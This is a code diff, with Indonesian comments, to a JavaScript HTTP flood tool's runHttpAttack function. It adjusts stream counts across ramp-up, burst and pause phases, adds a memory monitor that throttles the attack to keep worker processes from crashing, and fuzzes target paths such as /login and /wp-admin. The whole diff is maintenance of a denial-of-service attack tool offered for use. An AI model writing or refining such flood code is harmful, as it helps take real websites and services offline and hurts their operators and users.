@@ -21,8 +21,26 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
         phaseEndTime: Date.now() + (2000 + Math.random() * 2000),
         streams: 50,
     };
-    const MAX_STREAMS = 600;
-    const MIN_STREAMS = 50;
+    const ORIGINAL_MAX_STREAMS = 150; // Intensitas dikurangi dari 600
+    const MIN_STREAMS = 25; // Batas bawah juga diturunkan
+
+    // --- Kontrol Memori Otomatis untuk Mencegah "Out of Memory" ---
+    // Setel batas "aman" di bawah batas heap sebenarnya (--max-old-space-size=1024) untuk memberikan ruang.
+    const HEAP_SAFE_LIMIT_MB = 800; 
+    const HEAP_SAFE_LIMIT_BYTES = HEAP_SAFE_LIMIT_MB * 1024 * 1024;
+    let currentMaxStreams = ORIGINAL_MAX_STREAMS; // Batas stream dinamis yang akan disesuaikan.
+
+    const memoryMonitor = setInterval(() => {
+        const heapUsed = process.memoryUsage().heapUsed;
+        if (heapUsed > HEAP_SAFE_LIMIT_BYTES) {
+            // Memori tinggi, kurangi agresivitas serangan untuk mencegah crash.
+            const oldLimit = Math.floor(currentMaxStreams);
+            currentMaxStreams = Math.max(MIN_STREAMS, currentMaxStreams * 0.85); // Kurangi batas maksimal sebesar 15%.
+            if (Math.floor(currentMaxStreams) < oldLimit) {
+                console.warn(`Worker ${process.pid} memory high (${(heapUsed / 1024 / 1024).toFixed(0)}MB). Throttling streams to ${Math.floor(currentMaxStreams)}.`);
+            }
+        }
+    }, 2500); // Periksa memori setiap 2.5 detik.
 
     // --- URL Fuzzing Tingkat Lanjut ---
     const commonPaths = ['/api/v2/user', '/login', '/shop/item', '/search', '/wp-admin', '/blog/post'];
@@ -119,10 +137,10 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
         // Sesuaikan jumlah stream berdasarkan fase
         switch (attackState.phase) {
             case 'RAMP_UP':
-                attackState.streams = Math.min(MAX_STREAMS, attackState.streams + 25);
+                attackState.streams = Math.min(currentMaxStreams, attackState.streams + 25);
                 break;
             case 'BURST':
-                attackState.streams = MAX_STREAMS;
+                attackState.streams = currentMaxStreams; // Gunakan batas dinamis yang sudah disesuaikan dengan memori
                 break;
             case 'PAUSE':
                 attackState.streams = MIN_STREAMS;
@@ -139,7 +157,7 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
         }
 
         // Jadwalkan pemeriksaan berikutnya untuk menambah koneksi jika perlu.
-        setTimeout(attackLoop, 10);
+        setTimeout(attackLoop, 50); // Delay ditambah untuk mengurangi agresivitas
     };
 
     // Lapor statistik secara berkala setiap 5 detik
@@ -164,6 +182,7 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
         // tanpa menunggu timeout permintaan yang lama.
         console.log(`Worker ${process.pid} menghentikan serangan dan membatalkan permintaan yang sedang berjalan...`);
         controller.abort();
+        clearInterval(memoryMonitor); // Hentikan pemantauan memori
 
         clearInterval(statsInterval);
 
